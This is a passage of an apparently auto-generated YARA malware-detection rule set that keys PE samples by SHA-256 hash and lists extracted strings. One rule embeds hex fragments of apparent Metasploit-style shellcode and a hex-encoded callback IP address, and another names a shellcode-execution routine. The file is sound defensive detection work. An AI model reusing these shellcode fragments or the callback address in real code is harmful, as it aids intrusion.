      $s11 = "network reset" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s12 = "owner dead" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s13 = "connection aborted" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s14 = "protocol not supported" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s15 = "network unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 569 times */
      $s16 = "host unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 571 times */
      $s17 = "protocol error" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 588 times */
      $s18 = "permission denied" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 592 times */
      $s19 = "connection refused" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.40'*/ /* Goodware String - occured 597 times */
      $s20 = "broken pipe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.37'*/ /* Goodware String - occured 635 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule ae1cbeb25f83ecb39372f83e9c0ca36364e1cd0207f07afb4cd240b4b1b96842 {
   meta:
      description = "dataset - file ae1cbeb25f83ecb39372f83e9c0ca36364e1cd0207f07afb4cd240b4b1b96842"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "ae1cbeb25f83ecb39372f83e9c0ca36364e1cd0207f07afb4cd240b4b1b96842"
   strings:
      $s1 = "Invalid file name - %s The specified file was not found'\\'\\'%s\\'\\' is not a valid integer value" fullword wide /* score: '15.00'*/
      $s2 = "Abstract ErrorAAccess violation at address %p in module \\'%s\\'. %s of address %p" fullword wide /* score: '13.00'*/
      $s3 = "Application Error3Format \\'%s\\' invalid or incompatible with argument" fullword wide /* score: '12.00'*/
      $s4 = "No argument for format \\'%s\\'\"Variant method calls not supported" fullword wide /* score: '9.00'*/
      $s5 = "hr@#irC" fullword ascii /* score: '6.00'*/
      $s6 = "Mxlyfjc" fullword ascii /* score: '6.00'*/
      $s7 = "XGd+MDe SPY" fullword ascii /* score: '6.00'*/
      $s8 = "RDl#;V`/CMd$M" fullword ascii /* score: '6.00'*/
      $s9 = "@.data2" fullword ascii /* score: '5.00'*/
      $s10 = "\\YpIKY&Ich" fullword ascii /* score: '5.00'*/
      $s11 = "SysUtils" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 34 times */
      $s12 = "RXrF;X`" fullword ascii /* score: '4.00'*/
      $s13 = "tlHrDD/U" fullword ascii /* score: '4.00'*/
      $s14 = "XdCrC|\"M" fullword ascii /* score: '4.00'*/
      $s15 = "lnNnTnNn\\^N^Deo" fullword ascii /* score: '4.00'*/
      $s16 = "koMlS_M|[[M|Cz" fullword ascii /* score: '4.00'*/
      $s17 = "q,CgYpaL\"" fullword ascii /* score: '4.00'*/
      $s18 = "mhpFkhrF[h`Fc" fullword ascii /* score: '4.00'*/
      $s19 = "WTeFW%n.9vq" fullword ascii /* score: '4.00'*/
      $s20 = "sinKzBvMZ_" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_4b792c505b6dedad9f2a21c866212e96ae12c8415e3e9b249fa235e63398c2c8 {
   meta:
      description = "dataset - file 4b792c505b6dedad9f2a21c866212e96ae12c8415e3e9b249fa235e63398c2c8"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "4b792c505b6dedad9f2a21c866212e96ae12c8415e3e9b249fa235e63398c2c8"
   strings:
      $s1 = "Invalid file name - %s The specified file was not found'\\'\\'%s\\'\\' is not a valid integer value" fullword wide /* score: '15.00'*/
      $s2 = "Abstract ErrorAAccess violation at address %p in module \\'%s\\'. %s of address %p" fullword wide /* score: '13.00'*/
      $s3 = "Application Error3Format \\'%s\\' invalid or incompatible with argument" fullword wide /* score: '12.00'*/
      $s4 = "No argument for format \\'%s\\'\"Variant method calls not supported" fullword wide /* score: '9.00'*/
      $s5 = "hr@#irC" fullword ascii /* score: '6.00'*/
      $s6 = "Mxlyfjc" fullword ascii /* score: '6.00'*/
      $s7 = "XGd+MDe SPY" fullword ascii /* score: '6.00'*/
      $s8 = "RDl#;V`/CMd$M" fullword ascii /* score: '6.00'*/
      $s9 = "\\YpIKY&Ich" fullword ascii /* score: '5.00'*/
      $s10 = "@.data3" fullword ascii /* score: '5.00'*/
      $s11 = "SysUtils" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 34 times */
      $s12 = "RXrF;X`" fullword ascii /* score: '4.00'*/
      $s13 = "tlHrDD/U" fullword ascii /* score: '4.00'*/
      $s14 = "XdCrC|\"M" fullword ascii /* score: '4.00'*/
      $s15 = "lnNnTnNn\\^N^Deo" fullword ascii /* score: '4.00'*/
      $s16 = "koMlS_M|[[M|Cz" fullword ascii /* score: '4.00'*/
      $s17 = "q,CgYpaL\"" fullword ascii /* score: '4.00'*/
      $s18 = "mhpFkhrF[h`Fc" fullword ascii /* score: '4.00'*/
      $s19 = "WTeFW%n.9vq" fullword ascii /* score: '4.00'*/
      $s20 = "sinKzBvMZ_" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule sig_21633bb2e378d40e3e13b88bf3a7fd397ad1229eab9730cf93fc2cc260fbdd4f {
   meta:
      description = "dataset - file 21633bb2e378d40e3e13b88bf3a7fd397ad1229eab9730cf93fc2cc260fbdd4f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "21633bb2e378d40e3e13b88bf3a7fd397ad1229eab9730cf93fc2cc260fbdd4f"
   strings:
      $s1 = "Invalid file name - %s The specified file was not found'\\'\\'%s\\'\\' is not a valid integer value" fullword wide /* score: '15.00'*/
      $s2 = "Abstract ErrorAAccess violation at address %p in module \\'%s\\'. %s of address %p" fullword wide /* score: '13.00'*/
      $s3 = "Application Error3Format \\'%s\\' invalid or incompatible with argument" fullword wide /* score: '12.00'*/
      $s4 = "No argument for format \\'%s\\'\"Variant method calls not supported" fullword wide /* score: '9.00'*/
      $s5 = "hr@#irC" fullword ascii /* score: '6.00'*/
      $s6 = "Mxlyfjc" fullword ascii /* score: '6.00'*/
      $s7 = "XGd+MDe SPY" fullword ascii /* score: '6.00'*/
      $s8 = "RDl#;V`/CMd$M" fullword ascii /* score: '6.00'*/
      $s9 = "@.data2" fullword ascii /* score: '5.00'*/
      $s10 = "\\YpIKY&Ich" fullword ascii /* score: '5.00'*/
      $s11 = "SysUtils" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 34 times */
      $s12 = "RXrF;X`" fullword ascii /* score: '4.00'*/
      $s13 = "tlHrDD/U" fullword ascii /* score: '4.00'*/
      $s14 = "XdCrC|\"M" fullword ascii /* score: '4.00'*/
      $s15 = "lnNnTnNn\\^N^Deo" fullword ascii /* score: '4.00'*/
      $s16 = "koMlS_M|[[M|Cz" fullword ascii /* score: '4.00'*/
      $s17 = "q,CgYpaL\"" fullword ascii /* score: '4.00'*/
      $s18 = "mhpFkhrF[h`Fc" fullword ascii /* score: '4.00'*/
      $s19 = "WTeFW%n.9vq" fullword ascii /* score: '4.00'*/
      $s20 = "sinKzBvMZ_" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_7412c47f2db8f52182d8311dbc3539d2af5305c87f052a8d70eb6fd351723476 {
   meta:
      description = "dataset - file 7412c47f2db8f52182d8311dbc3539d2af5305c87f052a8d70eb6fd351723476"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7412c47f2db8f52182d8311dbc3539d2af5305c87f052a8d70eb6fd351723476"
   strings:
      $s1 = "Invalid file name - %s The specified file was not found'\\'\\'%s\\'\\' is not a valid integer value" fullword wide /* score: '15.00'*/
      $s2 = "Abstract ErrorAAccess violation at address %p in module \\'%s\\'. %s of address %p" fullword wide /* score: '13.00'*/
      $s3 = "Application Error3Format \\'%s\\' invalid or incompatible with argument" fullword wide /* score: '12.00'*/
      $s4 = "No argument for format \\'%s\\'\"Variant method calls not supported" fullword wide /* score: '9.00'*/
      $s5 = "hr@#irC" fullword ascii /* score: '6.00'*/
      $s6 = "Mxlyfjc" fullword ascii /* score: '6.00'*/
      $s7 = "XGd+MDe SPY" fullword ascii /* score: '6.00'*/
      $s8 = "RDl#;V`/CMd$M" fullword ascii /* score: '6.00'*/
      $s9 = "@.data2" fullword ascii /* score: '5.00'*/
      $s10 = "\\YpIKY&Ich" fullword ascii /* score: '5.00'*/
      $s11 = "SysUtils" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 34 times */
      $s12 = "RXrF;X`" fullword ascii /* score: '4.00'*/
      $s13 = "tlHrDD/U" fullword ascii /* score: '4.00'*/
      $s14 = "XdCrC|\"M" fullword ascii /* score: '4.00'*/
      $s15 = "lnNnTnNn\\^N^Deo" fullword ascii /* score: '4.00'*/
      $s16 = "koMlS_M|[[M|Cz" fullword ascii /* score: '4.00'*/
      $s17 = "q,CgYpaL\"" fullword ascii /* score: '4.00'*/
      $s18 = "mhpFkhrF[h`Fc" fullword ascii /* score: '4.00'*/
      $s19 = "WTeFW%n.9vq" fullword ascii /* score: '4.00'*/
      $s20 = "sinKzBvMZ_" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule cff4bdbf0ed1b324aa9691af0c0819bf0140ade95384557f546acc01af3d8326 {
   meta:
      description = "dataset - file cff4bdbf0ed1b324aa9691af0c0819bf0140ade95384557f546acc01af3d8326"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "cff4bdbf0ed1b324aa9691af0c0819bf0140ade95384557f546acc01af3d8326"
   strings:
      $s1 = "Invalid file name - %s The specified file was not found'\\'\\'%s\\'\\' is not a valid integer value" fullword wide /* score: '15.00'*/
      $s2 = "Abstract ErrorAAccess violation at address %p in module \\'%s\\'. %s of address %p" fullword wide /* score: '13.00'*/
      $s3 = "Application Error3Format \\'%s\\' invalid or incompatible with argument" fullword wide /* score: '12.00'*/
      $s4 = "No argument for format \\'%s\\'\"Variant method calls not supported" fullword wide /* score: '9.00'*/
      $s5 = "hr@#irC" fullword ascii /* score: '6.00'*/
      $s6 = "Mxlyfjc" fullword ascii /* score: '6.00'*/
      $s7 = "XGd+MDe SPY" fullword ascii /* score: '6.00'*/
      $s8 = "RDl#;V`/CMd$M" fullword ascii /* score: '6.00'*/
      $s9 = "\\YpIKY&Ich" fullword ascii /* score: '5.00'*/
      $s10 = "@.data3" fullword ascii /* score: '5.00'*/
      $s11 = "SysUtils" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 34 times */
      $s12 = "RXrF;X`" fullword ascii /* score: '4.00'*/
      $s13 = "tlHrDD/U" fullword ascii /* score: '4.00'*/
      $s14 = "XdCrC|\"M" fullword ascii /* score: '4.00'*/
      $s15 = "lnNnTnNn\\^N^Deo" fullword ascii /* score: '4.00'*/
      $s16 = "koMlS_M|[[M|Cz" fullword ascii /* score: '4.00'*/
      $s17 = "q,CgYpaL\"" fullword ascii /* score: '4.00'*/
      $s18 = "mhpFkhrF[h`Fc" fullword ascii /* score: '4.00'*/
      $s19 = "WTeFW%n.9vq" fullword ascii /* score: '4.00'*/
      $s20 = "sinKzBvMZ_" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule sig_712fb79d19d8e77a9f0b3f7d469a7277315838e242c821ee361ca70e1099d932 {
   meta:
      description = "dataset - file 712fb79d19d8e77a9f0b3f7d469a7277315838e242c821ee361ca70e1099d932"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "712fb79d19d8e77a9f0b3f7d469a7277315838e242c821ee361ca70e1099d932"
   strings:
      $s1 = "Invalid file name - %s The specified file was not found'\\'\\'%s\\'\\' is not a valid integer value" fullword wide /* score: '15.00'*/
      $s2 = "Abstract ErrorAAccess violation at address %p in module \\'%s\\'. %s of address %p" fullword wide /* score: '13.00'*/
      $s3 = "Application Error3Format \\'%s\\' invalid or incompatible with argument" fullword wide /* score: '12.00'*/
      $s4 = "No argument for format \\'%s\\'\"Variant method calls not supported" fullword wide /* score: '9.00'*/
      $s5 = "hr@#irC" fullword ascii /* score: '6.00'*/
      $s6 = "Mxlyfjc" fullword ascii /* score: '6.00'*/
      $s7 = "XGd+MDe SPY" fullword ascii /* score: '6.00'*/
      $s8 = "RDl#;V`/CMd$M" fullword ascii /* score: '6.00'*/
      $s9 = "@.data2" fullword ascii /* score: '5.00'*/
      $s10 = "\\YpIKY&Ich" fullword ascii /* score: '5.00'*/
      $s11 = "SysUtils" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97'*/ /* Goodware String - occured 34 times */
      $s12 = "RXrF;X`" fullword ascii /* score: '4.00'*/
      $s13 = "tlHrDD/U" fullword ascii /* score: '4.00'*/
      $s14 = "XdCrC|\"M" fullword ascii /* score: '4.00'*/
      $s15 = "lnNnTnNn\\^N^Deo" fullword ascii /* score: '4.00'*/
      $s16 = "koMlS_M|[[M|Cz" fullword ascii /* score: '4.00'*/
      $s17 = "q,CgYpaL\"" fullword ascii /* score: '4.00'*/
      $s18 = "mhpFkhrF[h`Fc" fullword ascii /* score: '4.00'*/
      $s19 = "WTeFW%n.9vq" fullword ascii /* score: '4.00'*/
      $s20 = "sinKzBvMZ_" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_32fc03caa22bc3bbf778b04da675e528dd7125a61da6f9fc5e532230745bcd8c {
   meta:
      description = "dataset - file 32fc03caa22bc3bbf778b04da675e528dd7125a61da6f9fc5e532230745bcd8c"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "32fc03caa22bc3bbf778b04da675e528dd7125a61da6f9fc5e532230745bcd8c"
   strings:
      $s1 = "self.exe" fullword wide /* score: '22.00'*/
      $s2 = " testapp.exe" fullword wide /* score: '19.00'*/
      $s3 = "sm.exe" fullword wide /* score: '16.00'*/
      $s4 = "ntdll.dlkernel32" fullword wide /* score: '12.00'*/
      $s5 = "pmmplk.bb.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "LdrGetProcedureA0" fullword ascii /* score: '10.00'*/
      $s7 = "content2,the7" fullword wide /* score: '9.00'*/
      $s8 = "blogstarting7channelPConcurrently," fullword wide /* score: '9.00'*/
      $s9 = "austinXDublin.engine.135" fullword wide /* score: '7.00'*/
      $s10 = "also4InzmickeyofS" fullword wide /* score: '7.00'*/
      $s11 = "JwebsiteTWwebsite5versionq" fullword wide /* score: '7.00'*/
      $s12 = "(+,P:\"" fullword ascii /* score: '7.00'*/
      $s13 = "CHENGDU YIWO Tech Development Co., Ltd (YIWO Tech Ltd, for short)." fullword wide /* score: '6.00'*/
      $s14 = "Copyright (c)2006-2008 CHENGDU YIWO Tech Development Co., Ltd." fullword wide /* score: '6.00'*/
      $s15 = "frommountainwasfF537" fullword wide /* score: '5.00'*/
      $s16 = "q\\K -S6^" fullword ascii /* score: '5.00'*/
      $s17 = "\"Pqg-o!." fullword ascii /* score: '5.00'*/
      $s18 = "F13Daenables" fullword ascii /* score: '4.00'*/
      $s19 = "betaorNUMFL" fullword wide /* score: '4.00'*/
      $s20 = "mNoalong" fullword wide /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule d2ec6b7a4c7d661c0aba50ffdf9d2bb1b50392d1a5ce30dde75dee9c36341a91 {
   meta:
      description = "dataset - file d2ec6b7a4c7d661c0aba50ffdf9d2bb1b50392d1a5ce30dde75dee9c36341a91"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "d2ec6b7a4c7d661c0aba50ffdf9d2bb1b50392d1a5ce30dde75dee9c36341a91"
   strings:
      $s1 = "LayeredBitmapCtrlDemo.EXE" fullword wide /* score: '22.00'*/
      $s2 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s3 = "LayeredBitmapCtrlDemo Version 1.1" fullword wide /* score: '7.00'*/
      $s4 = "Sunglasses" fullword ascii /* score: '6.00'*/
      $s5 = "D$ H;]" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s6 = "Cowboy Hat" fullword ascii /* score: '4.00'*/
      $s7 = "Code Project's Bob" fullword ascii /* score: '4.00'*/
      $s8 = ".?AVCLayeredBitmapCtrlDemoDlg@@" fullword ascii /* score: '4.00'*/
      $s9 = "Chainsaw" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = ".?AVCLayeredBitmapCtrl@@" fullword ascii /* score: '4.00'*/
      $s11 = "pCg!BBRM2b_r!G$KTQe&mW_O+U>ATdGuV+v1ssH&4M25xUg1W_Qe@Q3jM$u" fullword ascii /* score: '4.00'*/
      $s12 = "Valley of Fire" fullword ascii /* score: '4.00'*/
      $s13 = "t$HtDL" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "Chameleon Bob" fullword ascii /* score: '4.00'*/
      $s15 = ".?AVCLayerInfo@@" fullword ascii /* score: '4.00'*/
      $s16 = "D$0I;}" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s17 = "L$HD+L$@D" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = ".?AVCLayeredBitmapCtrlDemoApp@@" fullword ascii /* score: '4.00'*/
      $s19 = "|$Xt=H" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "About LayeredBitmapCtrlDemo" fullword wide /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule b0357ebcaa97a8f10ca5d940af9e5a2fb9675551956f6d58a2104899d53274ff {
   meta:
      description = "dataset - file b0357ebcaa97a8f10ca5d940af9e5a2fb9675551956f6d58a2104899d53274ff"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "b0357ebcaa97a8f10ca5d940af9e5a2fb9675551956f6d58a2104899d53274ff"
   strings:
      $s1 = ".rdata$voltmd" fullword ascii /* score: '4.00'*/
      $s2 = "xWI96tRI" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "OKEXI\\ANDM" fullword ascii /* score: '4.00'*/
      $s4 = "ipipzqvipiqiv`" fullword ascii /* score: '4.00'*/
      $s5 = "iyiyF/iyi" fullword ascii /* score: '4.00'*/
      $s6 = "(((iyix~yb`" fullword ascii /* score: '4.00'*/
      $s7 = "eKVADDI" fullword ascii /* score: '4.00'*/
      $s8 = ".CRT$XIAC" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s9 = "u0HcH<H" fullword ascii /* score: '1.00'*/
      $s10 = "D8\\0>t" fullword ascii /* score: '1.00'*/
      $s11 = "L$@D8]" fullword ascii /* score: '1.00'*/
      $s12 = ";(((F(@" fullword ascii /* score: '1.00'*/
      $s13 = "}Richa" fullword ascii /* score: '1.00'*/
      $s14 = "P0'.]^" fullword ascii /* score: '1.00'*/
      $s15 = "ppp`-((((x" fullword ascii /* score: '1.00'*/
      $s16 = "|^ALMJ\\" fullword ascii /* score: '1.00'*/
      $s17 = "CAJAJM\\(iba" fullword ascii /* score: '0.00'*/
      $s18 = "cAJLKC_" fullword ascii /* score: '0.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule sig_24197e271f0a1ae404e7e136a4d79d4e90537c18b4c598bef0801e32ca63b8c0 {
   meta:
      description = "dataset - file 24197e271f0a1ae404e7e136a4d79d4e90537c18b4c598bef0801e32ca63b8c0"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "24197e271f0a1ae404e7e136a4d79d4e90537c18b4c598bef0801e32ca63b8c0"
   strings:
      $x1 = "C:\\Users\\orawat\\code\\vs\\ssi_msf\\Release\\ssi_msf.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "557365722d4167656e743a204d6f7a696c6c612f352e302028636f6d70617469626c653b204d5349452031302e303b2057696e646f7773204e5420362e323b20" ascii /* score: '24.00'*/ /* hex encoded string 'User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch; MASPJS)' */
      $s3 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s4 = "2f5a25930a406bd092cf1264e8a73f1ec96f0a9dbb7fbd3e97c44e45633185529035bd6ab39e479a1be6478d7f20af65feaea6a6e917b4bf9d4684c5faaf8cc1" ascii /* score: '11.00'*/
      $s5 = "2f5a25930a406bd092cf1264e8a73f1ec96f0a9dbb7fbd3e97c44e45633185529035bd6ab39e479a1be6478d7f20af65feaea6a6e917b4bf9d4684c5faaf8cc1" ascii /* score: '11.00'*/
      $s6 = "15000053506857899fc6ffd5eb705b31d252680002408452525253525068eb552e3bffd589c683c35031ff57576aff5356682d06187bffd585c00f84c3010000" ascii /* score: '11.00'*/
      $s7 = "31ff85f6740489f9eb0968aac5e25dffd589c16845215e31ffd531ff576a0751565068b757e00bffd5bf002f000039c774b731ffe991010000e9c9010000e88b" ascii /* score: '11.00'*/
      $s8 = "fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01" ascii /* score: '8.00'*/
      $s9 = "d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d089442424" ascii /* score: '8.00'*/
      $s10 = "54140068f0b5a256ffd56a4068001000006800004000576858a453e5ffd593b90000000001d9515389e7576800200000535668129689e2ffd585c074c68b0701" ascii /* score: '8.00'*/
      $s11 = "557365722d4167656e743a204d6f7a696c6c612f352e302028636f6d70617469626c653b204d5349452031302e303b2057696e646f7773204e5420362e323b20" ascii /* score: '8.00'*/
      $s12 = "5b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6954684c772607ffd531ff5757575757683a5679a7ffd5e9840000005b31c951516a0351516843" ascii /* score: '8.00'*/
      $s13 = "303b2057696e646f7773204e5420362e323b20574f5736343b2054726964656e742f362e303b20546f7563683b204d4153504a53290d0a006e6e4e1d5ee0edcc" ascii /* score: '8.00'*/
      $s14 = "3c829cbb74617bb1e144668f7e8baa8e6ce900557365722d4167656e743a204d6f7a696c6c612f352e302028636f6d70617469626c653b204d5349452031302e" ascii /* score: '8.00'*/
      $s15 = "f6e6661724a25c5f550c08dc88f27c3ead794822eb397b9f9f745b47de8c72385cc895707f703af3ec0dcf85847f799c46b95091bf09d5b71c729ea49f7dac5e" ascii /* score: '8.00'*/
      $s16 = "c60568332dcb3595798a13acbabb4245139a2c2a0be0f9468c3c92d067129a7343e7a5ecaddfa8e89a54423d3eaa91df26e059bf146936086473f4a9e5626400" ascii /* score: '7.00'*/
      $s17 = "ffffff2f704a366c00d53fe50f7008e5f3d4be2865503142d12749a12a82da493190ca31bbf677c9aeb01fb83c4ca1244b1afb27d293bcb513cb419fe3661f0c" ascii /* score: '7.00'*/
      $s18 = "QQSVj8j@" fullword ascii /* score: '4.00'*/
      $s19 = "31ff85f6740489f9eb0968aac5e25dffd589c16845215e31ffd531ff576a0751565068b757e00bffd5bf002f" ascii /* score: '4.00'*/
      $s20 = "c385c075e558c3e8a9fdffff3132312e34302e31392e3536001969a08d" ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_0c71dcca7d39fd895a7b772ccd2370fc94f5e34423d87974c49f4d1c24cf103b {
   meta:
      description = "dataset - file 0c71dcca7d39fd895a7b772ccd2370fc94f5e34423d87974c49f4d1c24cf103b"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "0c71dcca7d39fd895a7b772ccd2370fc94f5e34423d87974c49f4d1c24cf103b"
   strings:
      $s1 = " ShellCodeExecute" fullword wide /* score: '25.00'*/
      $s2 = "test.dll" fullword ascii /* score: '23.00'*/
      $s3 = "graham.dll" fullword wide /* score: '23.00'*/
      $s4 = "ia7XNgXWiDgpEweifwvYnY2jKw5ooWs9sfzHPeDExn9mjm8KI5r2UJgfuJwRuKjv5BL1B715KeuKNbh8el7axqyIWcONbjkOZwThsyXTmTHGsnU1BDsHCwKWX0U5iPGy" ascii /* score: '16.00'*/
      $s5 = "l2CHVKab20NGnwUQbsMDj4G91pXrWKU0CfuxlJxOiHuE865FWEj9JML0u0BBqx7Z5VtN55YxdJNSTpCy3V1ZYAOJtVWHlF7TdmGtLSpyNriUGdnikMHnr2aCAwaSsNS6" ascii /* score: '12.00'*/
      $s6 = "ZK7zfaoWIs5xoyA7mXnlcu18qbLbpGWqZRlLIFW8XbBf32yEmfhq8b8NjGrr6WRwF7d9ehndikpI0KECHOQVHQ8jmFuS0Ypv3lStLx1Re6nR2DVPR8pCdjVaTVJGW03G" ascii /* score: '11.00'*/
      $s7 = "quKyO89AmThKEmgnHNpSywwhUGCkmMbf5qxanQcnMOUpSVaNi2OSFeMGW1phkA4NWoFWVeOhIr1SXd9eytO4iLhiT25T9YqlBEMFwm3Rydkx0CPd1WBHjLqyHeVie4FR" ascii /* score: '11.00'*/
      $s8 = "9aKjztkjv6wej2mD1L0I2LvYwUd2L8UIAzwrem20l4LGmmzFTHYGsau2RrioW1aNPG6TiuFAV8We8Xu3cVo9ZErazIH70iPKKJ0SXIuQ9nK4Z5wCURWv1fgf6Js5X04Q" ascii /* score: '11.00'*/
      $s9 = "0ZSlmLZJpmAMmysepdqbriB8NvAQ6OIT8VqKoQUFTFLLVizXEdnS6bEQXgiu4IumhSuRrfDyZi6ABpxfyz3JGX2QN4HqCHR6Xzrme29cjzfd5MvWgHk7b1rUk1S2mXtX" ascii /* score: '11.00'*/
      $s10 = "yd6I1ogjk0jZS0yLqNrQ5yN5Qtk7TgSQu2VxxuAaK027juujGM4eI6jdgj9hx2lKJhx6ZJtZxLG1mkHyyjD2iGF2OeoHdVvauFlSaLjACvwOmiIr6kMR5xLvCf3Cj4mj" ascii /* score: '11.00'*/
      $s11 = "wYpHUE7IbSRGEiz4sYizXj2drfCfvjsUaGq7R22YU2yqRJgZ39KnfEcG2HQh6DIVH8P3CoJ8bWk3TpGytiW4iTFKz80zk8irr6PNrIexcguXO1QTN4CUTeKBSve6cPqA" ascii /* score: '11.00'*/
      $s12 = "0ZSlmLZJpmAMmysepdqbriB8NvAQ6OIT8VqKoQUFTFLLVizXEdnS6bEQXgiu4IumhSuRrfDyZi6ABpxfyz3JGX2QN4HqCHR6Xzrme29cjzfd5MvWgHk7b1rUk1S2mXtX" ascii /* score: '11.00'*/
      $s13 = "txKEZeR1ghAzGwj2R7An9VYhoOT7E0srcJCpmXM0XqOAT4I76GhcspFwgTZzpvIDQaSgCvJPsLtG0DQRCWbY3yJHd9Zo71TDFFAKjbeUekJOqL5ZM1saPKYrGZclrx9Q" ascii /* score: '11.00'*/
      $s14 = "9aKjztkjv6wej2mD1L0I2LvYwUd2L8UIAzwrem20l4LGmmzFTHYGsau2RrioW1aNPG6TiuFAV8We8Xu3cVo9ZErazIH70iPKKJ0SXIuQ9nK4Z5wCURWv1fgf6Js5X04Q" ascii /* score: '11.00'*/
      $s15 = "x1skNyENIG8xb3HkZbHphsREzDKel2kzyFqXdCsDIMi2zPTDD1p5tEf3tPDx8eXGM6MGmBovBV3CPUqk6ncor41S1BMLf4RTZ9fht9JHNkmXOColNWgYVKjRJqeeEWgE" ascii /* score: '11.00'*/
      $s16 = "DyUULp0algjvRtFsUvMJU6a0vRYiPvRlAbrdL8MmU5dscm654RlDSadqLfeRv8PVSoxPR4ysXmtgKU3nA0pcy7aY6xTXJyXNzD8sF3qMAUBf3NoQmZY3NCXW6noY4cG6" ascii /* score: '11.00'*/
      $s17 = "4uuu3uXulufuAuluBususuluAuKubuAunuCu5uEuBuBuuubu3unuouwuouyupuPubuAuLuZuPuEuluSugucuoutuJuEudu5uWugu9uuu7u5uTuturuJuBuwuAuGu0uDu" ascii /* score: '11.00'*/
      $s18 = "X07q8zCIRA5tAyyMfz41zHxFmlmGr97DB1MIfVRw4zjM0dBPh7dngmtUDpwkLS7J88hBdVHS3Ikcu1oCwkYilu5AvEjnkCiX02jTbAxfB9nsnLwwp0KkMp5FFlRQLvio" ascii /* score: '11.00'*/
      $s19 = "U2Iud7l0KpyrfXLX6kKMrXVlozu6SkfndgaRa39cozn2uxA2JatLeu9YdAzf5cpyM8hSUYf6Tw80NY0GS2t5f2BUPinqLTu2NKINWwO0F4puX6zLUXtvS5dlVjFLrO9o" ascii /* score: '11.00'*/
      $s20 = "ia7XNgXWiDgpEweifwvYnY2jKw5ooWs9sfzHPeDExn9mjm8KI5r2UJgfuJwRuKjv5BL1B715KeuKNbh8el7axqyIWcONbjkOZwThsyXTmTHGsnU1BDsHCwKWX0U5iPGy" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

